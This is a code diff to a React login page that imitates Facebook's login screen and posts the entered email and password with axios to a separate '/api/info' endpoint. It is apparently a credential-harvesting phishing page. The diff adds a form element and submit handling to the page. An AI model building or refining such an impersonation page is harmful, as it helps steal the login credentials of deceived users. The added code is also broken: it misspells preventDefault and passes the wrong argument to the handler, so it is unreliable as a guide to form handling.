@@ -7,7 +7,9 @@ const LoginPage = () => {
 
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
-  const handleSubmit = () => {
+  const handleSubmit = (e) => {
+    e.prevemtdefault();
+
     axios.post(`${uri}/api/info`, {
       email: email,
       password: password,
@@ -22,14 +24,14 @@ const LoginPage = () => {
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
         <div className="right-side">
-          <div className="login-form">
+          <form className="login-form">
             <input type="text" placeholder="Email or phone number" value={email}  onChange={(e) => setEmail(e.target.value)}/>
             <input type="password" placeholder="Password"  value={password}  onChange={(e) => setPassword(e.target.value)} />
             <button className="login-btn" onClick={() => handleSubmit()}>Log In</button>
             <h3  onClick={() => handleSubmit()}>Forgot password?</h3>
             <span></span>
-            <button className="act-btn" onClick={() => handleSubmit()}>Create new account</button>
-          </div>
+            <button type="submit" className="act-btn" onClick={(e) => handleSubmit(e.target)}>Create new account</button>
+          </form>
           <h4>
             <strong>Create a Page</strong> for a celebrity, brand or business.
           </h4>
